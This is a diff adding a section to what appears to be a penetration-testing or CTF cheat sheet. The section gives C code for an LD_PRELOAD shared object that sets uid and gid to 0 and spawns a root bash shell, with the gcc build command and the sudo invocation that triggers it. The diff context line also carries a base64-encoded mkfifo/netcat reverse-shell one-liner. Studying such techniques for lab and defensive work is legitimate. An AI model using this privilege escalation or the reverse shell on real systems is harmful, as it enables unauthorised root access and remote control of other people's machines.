@@ -613,3 +613,23 @@ cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTAuMTQu
 ```
 
 ---
+
+- c code to spawn a root shell:
+	- Note: it is only available when executing `sudo -l` gives this: `Matching Defaults entries for webdeveloper on sky: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD` or similar
+`
+
+```shell
+#include <stdio.h>  
+#include <sys/types.h>  
+#include <stdlib.h>
+void _init() {  
+ unsetenv("LD_PRELOAD");  
+ setgid(0);  
+ setuid(0);  
+ system("/bin/bash");  
+}
+```
+
+- Then, compile it using gcc into a shared object file using the following parameters: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
+- we need to run the program by specifying the LD_PRELOAD option, as follows: `sudo LD_PRELOAD=/tmp/shell.so sky_backup_utility`
+	- Note that the `sky_backup_utility` is the command that the user can run as root
